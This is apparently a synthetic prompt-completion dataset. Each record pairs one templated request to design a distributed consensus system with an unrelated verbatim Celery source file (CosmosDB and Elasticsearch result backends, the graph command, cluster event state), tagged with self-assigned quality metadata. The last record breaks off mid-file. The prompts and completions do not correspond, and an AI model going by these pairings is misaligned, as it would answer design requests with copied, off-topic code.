RetryOptions(\n            max_retry_attempt_count=self._max_retry_attempts,\n            max_wait_time_in_seconds=self._max_retry_wait_time)\n\n        client = DocumentClient(\n            self._endpoint,\n            {\"masterKey\": self._key},\n            connection_policy=connection_policy,\n            consistency_level=self._consistency_level)\n\n        self._create_database_if_not_exists(client)\n        self._create_collection_if_not_exists(client)\n\n        return client\n\n    def _create_database_if_not_exists(self, client):\n        try:\n            client.CreateDatabase({\"id\": self._database_name})\n        except HTTPFailure as ex:\n            if ex.status_code != ERROR_EXISTS:\n                raise\n        else:\n            LOGGER.info(\"Created CosmosDB database %s\",\n                        self._database_name)\n\n    def _create_collection_if_not_exists(self, client):\n        try:\n            client.CreateCollection(\n                self._database_link,\n                {\"id\": self._collection_name,\n                 \"partitionKey\": {\"paths\": [\"/id\"],\n                                  \"kind\": PartitionKind.Hash}})\n        except HTTPFailure as ex:\n            if ex.status_code != ERROR_EXISTS:\n                raise\n        else:\n            LOGGER.info(\"Created CosmosDB collection %s/%s\",\n                        self._database_name, self._collection_name)\n\n    @cached_property\n    def _database_link(self):\n        return \"dbs/\" + self._database_name\n\n    @cached_property\n    def _collection_link(self):\n        return self._database_link + \"/colls/\" + self._collection_name\n\n    def _get_document_link(self, key):\n        return self._collection_link + \"/docs/\" + key\n\n    @classmethod\n    def _get_partition_key(cls, key):\n        if not key or key.isspace():\n            raise ValueError(\"Key cannot be none, empty or whitespace.\")\n\n        return {\"partitionKey\": key}\n\n    def get(self, key):\n        \"\"\"Read the value stored at the given key.\n\n        Args:\n              key: The key for which to read the value.\n\n        \"\"\"\n        key = bytes_to_str(key)\n        LOGGER.debug(\"Getting CosmosDB document %s/%s/%s\",\n                     self._database_name, self._collection_name, key)\n\n        try:\n            document = self._client.ReadDocument(\n                self._get_document_link(key),\n                self._get_partition_key(key))\n        except HTTPFailure as ex:\n            if ex.status_code != ERROR_NOT_FOUND:\n                raise\n            return None\n        else:\n            return document.get(\"value\")\n\n    def set(self, key, value):\n        \"\"\"Store a value for a given key.\n\n        Args:\n              key: The key at which to store the value.\n              value: The value to store.\n\n        \"\"\"\n        key = bytes_to_str(key)\n        LOGGER.debug(\"Creating CosmosDB document %s/%s/%s\",\n                     self._database_name, self._collection_name, key)\n\n        self._client.CreateDocument(\n            self._collection_link,\n            {\"id\": key, \"value\": value},\n            self._get_partition_key(key))\n\n    def mget(self, keys):\n        \"\"\"Read all the values for the provided keys.\n\n        Args:\n              keys: The list of keys to read.\n\n        \"\"\"\n        return [self.get(key) for key in keys]\n\n    def delete(self, key):\n        \"\"\"Delete the value at a given key.\n\n        Args:\n              key: The key of the value to delete.\n\n        \"\"\"\n        key = bytes_to_str(key)\n        LOGGER.debug(\"Deleting CosmosDB document %s/%s/%s\",\n                     self._database_name, self._collection_name, key)\n\n        self._client.DeleteDocument(\n            self._get_document_link(key),\n            self._get_partition_key(key))\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/backends/cosmosdbsql.py", "language": "python", "complexity": "complex", "star_count": 26879, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 219}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Elasticsearch result store backend.\"\"\"\nfrom datetime import datetime, timezone\n\nfrom kombu.utils.encoding import bytes_to_str\nfrom kombu.utils.url import _parse_url\n\nfrom celery import states\nfrom celery.exceptions import ImproperlyConfigured\n\nfrom .base import KeyValueStoreBackend\n\ntry:\n    import elasticsearch\nexcept ImportError:\n    elasticsearch = None\n\ntry:\n    import elastic_transport\nexcept ImportError:\n    elastic_transport = None\n\n__all__ = ('ElasticsearchBackend',)\n\nE_LIB_MISSING = \"\"\"\\\nYou need to install the elasticsearch library to use the Elasticsearch \\\nresult backend.\\\n\"\"\"\n\n\nclass ElasticsearchBackend(KeyValueStoreBackend):\n    \"\"\"Elasticsearch Backend.\n\n    Raises:\n        celery.exceptions.ImproperlyConfigured:\n            if module :pypi:`elasticsearch` is not available.\n    \"\"\"\n\n    index = 'celery'\n    doc_type = None\n    scheme = 'http'\n    host = 'localhost'\n    port = 9200\n    username = None\n    password = None\n    es_retry_on_timeout = False\n    es_timeout = 10\n    es_max_retries = 3\n\n    def __init__(self, url=None, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.url = url\n        _get = self.app.conf.get\n\n        if elasticsearch is None:\n            raise ImproperlyConfigured(E_LIB_MISSING)\n\n        index = doc_type = scheme = host = port = username = password = None\n\n        if url:\n            scheme, host, port, username, password, path, _ = _parse_url(url)\n            if scheme == 'elasticsearch':\n                scheme = None\n            if path:\n                path = path.strip('/')\n                index, _, doc_type = path.partition('/')\n\n        self.index = index or self.index\n        self.doc_type = doc_type or self.doc_type\n        self.scheme = scheme or self.scheme\n        self.host = host or self.host\n        self.port = port or self.port\n        self.username = username or self.username\n        self.password = password or self.password\n\n        self.es_retry_on_timeout = (\n            _get('elasticsearch_retry_on_timeout') or self.es_retry_on_timeout\n        )\n\n        es_timeout = _get('elasticsearch_timeout')\n        if es_timeout is not None:\n            self.es_timeout = es_timeout\n\n        es_max_retries = _get('elasticsearch_max_retries')\n        if es_max_retries is not None:\n            self.es_max_retries = es_max_retries\n\n        self.es_save_meta_as_text = _get('elasticsearch_save_meta_as_text', True)\n        self._server = None\n\n    def exception_safe_to_retry(self, exc):\n        if isinstance(exc, elasticsearch.exceptions.ApiError):\n            # 401: Unauthorized\n            # 409: Conflict\n            # 500: Internal Server Error\n            # 502: Bad Gateway\n            # 504: Gateway Timeout\n            # N/A: Low level exception (i.e. socket exception)\n            if exc.status_code in {401, 409, 500, 502, 504, 'N/A'}:\n                return True\n        if isinstance(exc, elasticsearch.exceptions.TransportError):\n            return True\n        return False\n\n    def get(self, key):\n        try:\n            res = self._get(key)\n            try:\n                if res['found']:\n                    return res['_source']['result']\n            except (TypeError, KeyError):\n                pass\n        except elasticsearch.exceptions.NotFoundError:\n            pass\n\n    def _get(self, key):\n        if self.doc_type:\n            return self.server.get(\n                index=self.index,\n                id=key,\n                doc_type=self.doc_type,\n            )\n        else:\n            return self.server.get(\n                index=self.index,\n                id=key,\n            )\n\n    def _set_with_state(self, key, value, state):\n        body = {\n            'result': value,\n            '@timestamp': '{}Z'.format(\n                datetime.now(timezone.utc).isoformat()[:-9]\n            ),\n        }\n        try:\n            self._index(\n                id=key,\n                body=body,\n            )\n        except elasticsearch.exceptions.ConflictError:\n            # document already exists, update it\n            self._update(key, body, state)\n\n    def set(self, key, value):\n        return self._set_with_state(key, value, None)\n\n    def _index(self, id, body, **kwargs):\n        body = {bytes_to_str(k): v for k, v in body.items()}\n        if self.doc_type:\n            return self.server.index(\n                id=bytes_to_str(id),\n                index=self.index,\n                doc_type=self.doc_type,\n                body=body,\n                params={'op_type': 'create'},\n                **kwargs\n            )\n        else:\n            return self.server.index(\n                id=bytes_to_str(id),\n                index=self.index,\n                body=body,\n                params={'op_type': 'create'},\n                **kwargs\n            )\n\n    def _update(self, id, body, state, **kwargs):\n        \"\"\"Update state in a conflict free manner.\n\n        If state is defined (not None), this will not update ES server if either:\n        * existing state is success\n        * existing state is a ready state and current state in not a ready state\n\n        This way, a Retry state cannot override a Success or Failure, and chord_unlock\n        will not retry indefinitely.\n        \"\"\"\n        body = {bytes_to_str(k): v for k, v in body.items()}\n\n        try:\n            res_get = self._get(key=id)\n            if not res_get.get('found'):\n                return self._index(id, body, **kwargs)\n            # document disappeared between index and get calls.\n        except elasticsearch.exceptions.NotFoundError:\n            return self._index(id, body, **kwargs)\n\n        try:\n            meta_present_on_backend = self.decode_result(res_get['_source']['result'])\n        except (TypeError, KeyError):\n            pass\n        else:\n            if meta_present_on_backend['status'] == states.SUCCESS:\n                # if stored state is already in success, do nothing\n                return {'result': 'noop'}\n            elif meta_present_on_backend['status'] in states.READY_STATES and state in states.UNREADY_STATES:\n                # if stored state is in ready state and current not, do nothing\n                return {'result': 'noop'}\n\n        # get current sequence number and primary term\n        # https://www.elastic.co/guide/en/elasticsearch/reference/current/optimistic-concurrency-control.html\n        seq_no = res_get.get('_seq_no', 1)\n        prim_term = res_get.get('_primary_term', 1)\n\n        # try to update document with current seq_no and primary_term\n        if self.doc_type:\n            res = self.server.update(\n                id=bytes_to_str(id),\n                index=self.index,\n                doc_type=self.doc_type,\n                body={'doc': body},\n                params={'if_primary_term': prim_term, 'if_seq_no': seq_no},\n                **kwargs\n            )\n        else:\n            res = self.server.update(\n                id=bytes_to_str(id),\n                index=self.index,\n                body={'doc': body},\n                params={'if_primary_term': prim_term, 'if_seq_no': seq_no},\n                **kwargs\n            )\n        # result is elastic search update query result\n        # noop = query did not update any document\n        # updated = at least one document got updated\n        if res['result'] == 'noop':\n            raise elasticsearch.exceptions.ConflictError(\n                \"conflicting update occurred concurrently\",\n                elastic_transport.ApiResponseMeta(409, \"HTTP/1.1\",\n                                                  elastic_transport.HttpHeaders(), 0, elastic_transport.NodeConfig(\n                                                      self.scheme, self.host, self.port)), None)\n        return res\n\n    def encode(self, data):\n        if self.es_save_meta_as_text:\n            return super().encode(data)\n        else:\n            if not isinstance(data, dict):\n                return super().encode(data)\n            if data.get(\"result\"):\n                data[\"result\"] = self._encode(data[\"result\"])[2]\n            if data.get(\"traceback\"):\n                data[\"traceback\"] = self._encode(data[\"traceback\"])[2]\n            return data\n\n    def decode(self, payload):\n        if self.es_save_meta_as_text:\n            return super().decode(payload)\n        else:\n            if not isinstance(payload, dict):\n                return super().decode(payload)\n            if payload.get(\"result\"):\n                payload[\"result\"] = super().decode(payload[\"result\"])\n            if payload.get(\"traceback\"):\n                payload[\"traceback\"] = super().decode(payload[\"traceback\"])\n            return payload\n\n    def mget(self, keys):\n        return [self.get(key) for key in keys]\n\n    def delete(self, key):\n        if self.doc_type:\n            self.server.delete(index=self.index, id=key, doc_type=self.doc_type)\n        else:\n            self.server.delete(index=self.index, id=key)\n\n    def _get_server(self):\n        \"\"\"Connect to the Elasticsearch server.\"\"\"\n        http_auth = None\n        if self.username and self.password:\n            http_auth = (self.username, self.password)\n        return elasticsearch.Elasticsearch(\n            f'{self.scheme}://{self.host}:{self.port}',\n            retry_on_timeout=self.es_retry_on_timeout,\n            max_retries=self.es_max_retries,\n            timeout=self.es_timeout,\n            http_auth=http_auth,\n        )\n\n    @property\n    def server(self):\n        if self._server is None:\n            self._server = self._get_server()\n        return self._server\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/backends/elasticsearch.py", "language": "python", "complexity": "complex", "star_count": 26879, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 284}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"The ``celery graph`` command.\"\"\"\nimport sys\nfrom operator import itemgetter\n\nimport click\n\nfrom celery.bin.base import CeleryCommand, handle_preload_options\nfrom celery.utils.graph import DependencyGraph, GraphFormatter\n\n\n@click.group()\n@click.pass_context\n@handle_preload_options\ndef graph(ctx):\n    \"\"\"The ``celery graph`` command.\"\"\"\n\n\n@graph.command(cls=CeleryCommand, context_settings={'allow_extra_args': True})\n@click.pass_context\ndef bootsteps(ctx):\n    \"\"\"Display bootsteps graph.\"\"\"\n    worker = ctx.obj.app.WorkController()\n    include = {arg.lower() for arg in ctx.args or ['worker', 'consumer']}\n    if 'worker' in include:\n        worker_graph = worker.blueprint.graph\n        if 'consumer' in include:\n            worker.blueprint.connect_with(worker.consumer.blueprint)\n    else:\n        worker_graph = worker.consumer.blueprint.graph\n    worker_graph.to_dot(sys.stdout)\n\n\n@graph.command(cls=CeleryCommand, context_settings={'allow_extra_args': True})\n@click.pass_context\ndef workers(ctx):\n    \"\"\"Display workers graph.\"\"\"\n    def simplearg(arg):\n        return maybe_list(itemgetter(0, 2)(arg.partition(':')))\n\n    def maybe_list(l, sep=','):\n        return l[0], l[1].split(sep) if sep in l[1] else l[1]\n\n    args = dict(simplearg(arg) for arg in ctx.args)\n    generic = 'generic' in args\n\n    def generic_label(node):\n        return '{} ({}://)'.format(type(node).__name__,\n                                   node._label.split('://')[0])\n\n    class Node:\n        force_label = None\n        scheme = {}\n\n        def __init__(self, label, pos=None):\n            self._label = label\n            self.pos = pos\n\n        def label(self):\n            return self._label\n\n        def __str__(self):\n            return self.label()\n\n    class Thread(Node):\n        scheme = {\n            'fillcolor': 'lightcyan4',\n            'fontcolor': 'yellow',\n            'shape': 'oval',\n            'fontsize': 10,\n            'width': 0.3,\n            'color': 'black',\n        }\n\n        def __init__(self, label, **kwargs):\n            self.real_label = label\n            super().__init__(\n                label=f'thr-{next(tids)}',\n                pos=0,\n            )\n\n    class Formatter(GraphFormatter):\n\n        def label(self, obj):\n            return obj and obj.label()\n\n        def node(self, obj):\n            scheme = dict(obj.scheme) if obj.pos else obj.scheme\n            if isinstance(obj, Thread):\n                scheme['label'] = obj.real_label\n            return self.draw_node(\n                obj, dict(self.node_scheme, **scheme),\n            )\n\n        def terminal_node(self, obj):\n            return self.draw_node(\n                obj, dict(self.term_scheme, **obj.scheme),\n            )\n\n        def edge(self, a, b, **attrs):\n            if isinstance(a, Thread):\n                attrs.update(arrowhead='none', arrowtail='tee')\n            return self.draw_edge(a, b, self.edge_scheme, attrs)\n\n    def subscript(n):\n        S = {'0': '₀', '1': '₁', '2': '₂', '3': '₃', '4': '₄',\n             '5': '₅', '6': '₆', '7': '₇', '8': '₈', '9': '₉'}\n        return ''.join([S[i] for i in str(n)])\n\n    class Worker(Node):\n        pass\n\n    class Backend(Node):\n        scheme = {\n            'shape': 'folder',\n            'width': 2,\n            'height': 1,\n            'color': 'black',\n            'fillcolor': 'peachpuff3',\n        }\n\n        def label(self):\n            return generic_label(self) if generic else self._label\n\n    class Broker(Node):\n        scheme = {\n            'shape': 'circle',\n            'fillcolor': 'cadetblue3',\n            'color': 'cadetblue4',\n            'height': 1,\n        }\n\n        def label(self):\n            return generic_label(self) if generic else self._label\n\n    from itertools import count\n    tids = count(1)\n    Wmax = int(args.get('wmax', 4) or 0)\n    Tmax = int(args.get('tmax', 3) or 0)\n\n    def maybe_abbr(l, name, max=Wmax):\n        size = len(l)\n        abbr = max and size > max\n        if 'enumerate' in args:\n            l = [f'{name}{subscript(i + 1)}'\n                 for i, obj in enumerate(l)]\n        if abbr:\n            l = l[0:max - 1] + [l[size - 1]]\n            l[max - 2] = '{}⎨…{}⎬'.format(\n                name[0], subscript(size - (max - 1)))\n        return l\n\n    app = ctx.obj.app\n    try:\n        workers = args['nodes']\n        threads = args.get('threads') or []\n    except KeyError:\n        replies = app.control.inspect().stats() or {}\n        workers, threads = [], []\n        for worker, reply in replies.items():\n            workers.append(worker)\n            threads.append(reply['pool']['max-concurrency'])\n\n    wlen = len(workers)\n    backend = args.get('backend', app.conf.result_backend)\n    threads_for = {}\n    workers = maybe_abbr(workers, 'Worker')\n    if Wmax and wlen > Wmax:\n        threads = threads[0:3] + [threads[-1]]\n    for i, threads in enumerate(threads):\n        threads_for[workers[i]] = maybe_abbr(\n            list(range(int(threads))), 'P', Tmax,\n        )\n\n    broker = Broker(args.get(\n        'broker', app.connection_for_read().as_uri()))\n    backend = Backend(backend) if backend else None\n    deps = DependencyGraph(formatter=Formatter())\n    deps.add_arc(broker)\n    if backend:\n        deps.add_arc(backend)\n    curworker = [0]\n    for i, worker in enumerate(workers):\n        worker = Worker(worker, pos=i)\n        deps.add_arc(worker)\n        deps.add_edge(worker, broker)\n        if backend:\n            deps.add_edge(worker, backend)\n        threads = threads_for.get(worker._label)\n        if threads:\n            for thread in threads:\n                thread = Thread(thread)\n                deps.add_arc(thread)\n                deps.add_edge(thread, worker)\n\n        curworker[0] += 1\n\n    deps.to_dot(sys.stdout)\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/bin/graph.py", "language": "python", "complexity": "medium", "star_count": 26879, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 198}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"In-memory representation of cluster state.\n\nThis module implements a data-structure used to keep\ntrack of the state of a cluster of workers and the tasks\nit is working on (by consuming events).\n\nFor every event consumed the state is updated,\nso the state represents the state of the cluster\nat the time of the last event.\n\nSnapshots (:mod:`celery.events.snapshot`) can be used to\ntake \"pictures\" of this state at regular intervals\nto for example, store that in a database.\n\"\"\"\nimport bisect\nimport sys\nimport threading\nfrom collections import defaultdict\nfrom collections.abc import Callable\nfrom datetime import datetime\nfrom decimal import Decimal\nfrom itertools import islice\nfrom operator import itemgetter\nfrom time import time\nfrom typing import Mapping, Optional  # noqa\nfrom weakref import WeakSet, ref\n\nfrom kombu.clocks import timetuple\nfrom kombu.utils.objects import cached_property\n\nfrom celery import states\nfrom celery.utils.functional import LRUCache, memoize, pass1\nfrom celery.utils.log import get_logger\n\n__all__ = ('Worker', 'Task', 'State', 'heartbeat_expires')\n\n# pylint: disable=redefined-outer-name\n# We cache globals and attribute lookups, so disable this warning.\n# pylint: disable=too-many-function-args\n# For some reason pylint thinks ._event is a method, when it's a property.\n\n#: Set if running PyPy\nPYPY = hasattr(sys, 'pypy_version_info')\n\n#: The window (in percentage) is added to the workers heartbeat\n#: frequency.  If the time between updates exceeds this window,\n#: then the worker is considered to be offline.\nHEARTBEAT_EXPIRE_WINDOW = 200\n\n#: Max drift between event timestamp and time of event received\n#: before we alert that clocks may be unsynchronized.\nHEARTBEAT_DRIFT_MAX = 16\n\nDRIFT_WARNING = (\n    \"Substantial drift from %s may mean clocks are out of sync.  Current drift is \"\n    \"%s seconds.  [orig: %s recv: %s]\"\n)\n\nlogger = get_logger(__name__)\nwarn = logger.warning\n\nR_STATE = '<State: events={0.event_count} tasks={0.task_count}>'\nR_WORKER = '<Worker: {0.hostname} ({0.status_string} clock:{0.clock})'\nR_TASK = '<Task: {0.name}({0.uuid}) {0.state} clock:{0.clock}>'\n\n#: Mapping of task event names to task state.\nTASK_EVENT_TO_STATE = {\n    'sent': states.PENDING,\n    'received': states.RECEIVED,\n    'started': states.STARTED,\n    'failed': states.FAILURE,\n    'retried': states.RETRY,\n    'succeeded': states.SUCCESS,\n    'revoked': states.REVOKED,\n    'rejected': states.REJECTED,\n}\n\n\nclass CallableDefaultdict(defaultdict):\n    \"\"\":class:`~collections.defaultdict` with configurable __call__.\n\n    We use this for backwards compatibility in State.tasks_by_type\n    etc, which used to be a method but is now an index instead.\n\n    So you can do::\n\n        >>> add_tasks = state.tasks_by_type['proj.tasks.add']\n\n    while still supporting the method call::\n\n        >>> add_tasks = list(state.tasks_by_type(\n        ...     'proj.tasks.add', reverse=True))\n    \"\"\"\n\n    def __init__(self, fun, *args, **kwargs):\n        self.fun = fun\n        super().__init__(*args, **kwargs)\n\n    def __call__(self, *args, **kwargs):\n        return self.fun(*args, **kwargs)\n\n\nCallable.register(CallableDefaultdict)\n\n\n@memoize(maxsize=1000, keyfun=lambda a, _: a[0])\ndef _warn_drift(hostname, drift, local_received, timestamp):\n    # we use memoize here so the warning is only logged once per hostname\n    warn(DRIFT_WARNING, hostname, drift,\n         datetime.fromtimestamp(local_received),\n         datetime.fromtimestamp(timestamp))\n\n\ndef heartbeat_expires(timestamp, freq=60,\n                      expire_window=HEARTBEAT_EXPIRE_WINDOW,\n                      Decimal=Decimal, float=float, isinstance=isinstance):\n    \"\"\"Return time when heartbeat expires.\"\"\"\n    # some json implementations returns decimal.Decimal objects,\n    # which aren't compatible with float.\n    freq = float(freq) if isinstance(freq, Decimal) else freq\n    if isinstance(timestamp, Decimal):\n        timestamp = float(timestamp)\n    return timestamp + (freq * (expire_window / 1e2))\n\n\ndef _depickle_task(cls, fields):\n    return cls(**fields)\n\n\ndef with_unique_field(attr):\n\n    def _decorate_cls(cls):\n\n        def __eq__(this, other):\n            if isinstance(other, this.__class__):\n                return getattr(this, attr) == getattr(other, attr)\n            return NotImplemented\n        cls.__eq__ = __eq__\n\n        def __hash__(this):\n            return hash(getattr(this, attr))\n        cls.__hash__ = __hash__\n\n        return cls\n    return _decorate_cls\n\n\n@with_unique_field('hostname')\nclass Worker:\n    \"\"\"Worker State.\"\"\"\n\n    heartbeat_max = 4\n    expire_window = HEARTBEAT_EXPIRE_WINDOW\n\n    _fields = ('hostname', 'pid', 'freq', 'heartbeats', 'clock',\n               'active', 'processed', 'loadavg', 'sw_ident',\n               'sw_ver', 'sw_sys')\n    if not PYPY:  # pragma: no cover\n        __slots__ = _fields + ('event', '__dict__', '__weakref__')\n\n    def __init__(self, hostname=None, pid=None, freq=60,\n                 heartbeats=None, clock=0, active=None, processed=None,\n                 loadavg=None, sw_ident=None, sw_ver=None, sw_sys=None):\n        self.hostname = hostname\n        self.pid = pid\n        self.freq = freq\n        self.heartbeats = [] if heartbeats is None else heartbeats\n        self.clock = clock or 0\n        self.active = active\n        self.processed = processed\n        self.loadavg = loadavg\n        self.sw_ident = sw_ident\n        self.sw_ver = sw_ver\n        self.sw_sys = sw_sys\n        self.event = self._create_event_handler()\n\n    def __reduce__(self):\n        return self.__class__, (self.hostname, self.pid, self.freq,\n                                self.heartbeats, self.clock, self.active,\n                                self.processed, self.loadavg, self.sw_ident,\n                                self.sw_ver, self.sw_sys)\n\n    def _create_event_handler(self):\n        _set = object.__setattr__\n        hbmax = self.heartbeat_max\n        heartbeats = self.heartbeats\n        hb_pop = self.heartbeats.pop\n        hb_append = self.heartbeats.append\n\n        def event(type_, timestamp=None,\n                  local_received=None, fields=None,\n                  max_drift=HEARTBEAT_DRIFT_MAX, abs=abs, int=int,\n                  insort=bisect.insort, len=len):\n            fields = fields or {}\n            for k, v in fields.items():\n                _set(self, k, v)\n            if type_ == 'offline':\n                heartbeats[:] = []\n            else:\n                if not local_received or not timestamp:\n                    return\n                drift = abs(int(local_received) - int(timestamp))\n                if drift > max_drift:\n                    _warn_drift(self.hostname, drift,\n                                local_received, timestamp)\n                if local_received:  # pragma: no cover\n                    hearts = len(heartbeats)\n                    if hearts > hbmax - 1:\n                        hb_pop(0)\n                    if hearts and local_received > heartbeats[-1]:\n                        hb_append(local_received)\n                    else:\n                        insort(heartbeats, local_received)\n        return event\n\n    def update(self, f, **kw):\n        d = dict(f, **kw) if kw else f\n        for k, v in d.items():\n            setattr(self, k, v)\n\n    def __repr__(self):\n        return R_WORKER.format(self)\n\n    @property\n    def status_string(self):\n        return 'ONLINE' if self.alive else 'OFFLINE'\n\n    @property\n    def heartbeat_expires(self):\n        return heartbeat_expires(self.heartbeats[-1],\n                                 self.freq, self.expire_window)\n\n    @property\n    def alive(self, nowfun=time):\n        return bool(self.heartbeats and nowfun() < self.heartbeat_expires)\n\n    @property\n    def id(self):\n        return '{0.hostname}.{0.pid}'.format(self)\n\n\n@with_unique_field('uuid')\nclass Task:\n    \"\"\"Task State.\"\"\"\n\n    name = received = sent = started = succeeded = failed = retried = \\\n        revoked = rejected = args = kwargs = eta = expires = retries = \\\n        worker = result = exception = timestamp = runtime = traceback = \\\n        exchange = routing_key = root_id = parent_id = client = None\n    state = states.PENDING\n    clock = 0\n\n    _fields = (\n        'uuid', 'name', 'state', 'received', 'sent', 'started', 'rejected',\n        'succeeded', 'failed', 'retried', 'revoked', 'args', 'kwargs',\n        'eta', 'expires', 'retries', 'worker', 'result', 'exception',\n        'timestamp', 'runtime', 'traceback', 'exchange', 'routing_key',\n        'clock', 'client', 'root', 'root_id', 'parent', 'parent_id',\n        'children',\n    )\n    if not PYPY:  # pragma: no cover\n        __slots__ = ('__dict__', '__weakref__')\n\n    #: How to merge out of order events.\n    #: Disorder is detected by logical ordering (e.g., :event:`task-received`\n    #: must've happened before a :event:`task-failed` event).\n    #:\n    #: A merge rule consists of a state and a list of fields to keep from\n    #: that state. ``(RECEIVED, ('name', 'args')``, means the name and args\n    #: fields are always taken from the RECEIVED state, and any values for\n    #: these fields received before or after is simply ignored.\n    merge_rules = {\n        states.RECEIVED: (\n            'name', 'args', 'kwargs', 'parent_id',\n            'root_id', 'retries', 'eta', 'expires',\n        ),\n    }\n\n    #: meth:`info` displays these fields by default.\n    _info_fields = (\n        'args', 'kwargs', 'retries', 'result', 'eta', 'runtime',\n        'expires', 'exception', 'exchange', 'routing_key',\n        'root_id', 'parent_id',\n    )\n\n    def __init__(self, uuid=None, cluster_state=None, children=None, **kwargs):\n        self.uuid = uuid\n        self.cluster_state = cluster_state\n        if self.cluster_state is not None:\n            self.children = WeakSet(\n                self.cluster_state.tasks.get(task_id)\n                for task_id in children or ()\n                if task_id in self.cluster_state.tasks\n            )\n        else:\n            self.children = WeakSet()\n        self._serializer_handlers = {\n            'children': self._serializable_children,\n            'root': self._serializable_root,\n            'parent': self._serializable_parent,\n        }\n        if kwargs:\n            self.__dict__.update(kwargs)\n\n    def event(self, type_, timestamp=None, local_received=None, fields=None,\n              precedence=states.precedence, setattr=setattr,\n              task_event_to_state=TASK_EVENT_TO_STATE.get, RETRY=states.RETRY):\n        fields = fields or {}\n\n        # using .get is faster than catching KeyError in this case.\n        state = task_event_to_state(type_)\n        if state is not None:\n            # sets, for example, self.succeeded to the timestamp.\n            setattr(self, type_, timestamp)\n        else:\n            state = type_.upper()  # custom state\n\n        # note that precedence here is reversed\n        # see implementation in celery.states.state.__lt__\n        if state != RETRY and self.state != RETRY and \\\n                precedence(state) > precedence(self.state):\n            # this state logically happens-before the current state, so merge.\n            keep = self.merge_rules.get(state)\n            if keep is not None:\n                fields = {\n                    k: v for k, v in fields.items() if k in keep\n                }\n        else:\n            fields.update(state=state, timestamp=timestamp)\n\n        # update current state with info from this event.\n        self.__dict__.update(fields)\n\n    def info(self, fields=None, extra=None):\n        \"\"\"Information about this task suitable for on-screen display.\"\"\"\n        extra = [] if not extra else extra\n        fields = self._info_fields if fields is None else fields\n\n        def _keys():\n            for key in list(fields) + list(extra):\n                value = getattr(self, key, None)\n                if value is not None:\n                    yield key, value\n\n        return dict(_keys())\n\n    def __repr__(self):\n        return R_TASK.format(self)\n\n    def as_dict(self):\n        get = object.__getattribute__\n        handler = self._serializer_handlers.get\n        return {\n            k: handler(k, pass1)(get(self, k)) for k in self._fields\n        }\n\n    def _serializable_children(self, value):\n        return [task.id for task in self.children]\n\n    def _serializable_root(self, value):\n        return self.root_id\n\n    def _serializable_parent(self, value):\n        return self.parent_id\n\n    def __reduce__(self):\n        return _depickle_task, (self.__class__, self.as_dict())\n\n    @property\n    def id(self):\n        return self.uuid\n\n    @property\n    def origin(self):\n        return self.client if self.worker is None else self.worker.id\n\n    @property\n    def ready(self):\n        return self.state in states.READY_STATES\n\n    @cached_property\n    def parent(self):\n        # issue github.com/mher/flower/issues/648\n        try:\n            return self.parent_id and self.cluster_state.tasks.data[self.parent_id]\n        except KeyError:\n            return None\n\n    @cached_property\n    def root(self):\n        # issue github.com/mher/flower/issues/648\n        try:\n            return self.root_id and self.cluster_state.tasks.data[self.root_id]\n        except KeyError:\n            return None\n\n\nclass State:\n    \"\"\"Records clusters state.\"\"\"\n\n    Worker = Worker\n    Task = Task\n    event_count = 0\n    task_count = 0\n    heap_multiplier = 4\n\n    def __init__(self, callback=None,\n                 workers=None, tasks=None, taskheap=None,\n                 max_workers_in_memory=5000, max_tasks_in_memory=10000,\n                 on_node_join=None, on_node_leave=None,\n                 tasks_by_type=None, tasks_by_worker=None):\n        self.event_callback = callback\n        self.workers = (LRUCache(max_workers_in_memory)\n                        if workers is None else workers)\n        self.tasks = (LRUCache(max_tasks_in_memory)\n                      if tasks is None else tasks)\n        self._taskheap = [] if taskheap is None else taskheap\n        self.max_workers_in_memory = max_workers_in_memory\n        self.max_tasks_in_memory = max_tasks_in_memory\n        self.on_node_join = on_node_join\n        self.on_node_leave = on_node_leave\n        self._mutex = threading.Lock()\n        self.handlers = {}\n        self._seen_types = set()\n        self._tasks_to_resolve = {}\n        self.rebuild_taskheap()\n\n        self.tasks_by_type = CallableDefaultdict(\n            self._tasks_by_type, WeakSet)  # type: Mapping[str, WeakSet[Task]]\n        self.tasks_by_type.update(\n            _deserialize_Task_WeakSet_Mapping(tasks_by_type, self.tasks))\n\n        self.tasks_by_worker = CallableDefaultdict(\n            self._tasks_by_worker, WeakSet)  # type: Mapping[str, WeakSet[Task]]\n        self.tasks_by_worker.update(\n            _deserialize_Task_WeakSet_Mapping(tasks_by_worker, self.tasks))\n\n    @cached_property\n    def _event(self):\n        return self._create_dispatcher()\n\n    def freeze_while(self, fun, *args, **kwargs):\n        clear_after = kwargs.pop('clear_after', False)\n        with self._mutex:\n            try:\n                return fun(*args, 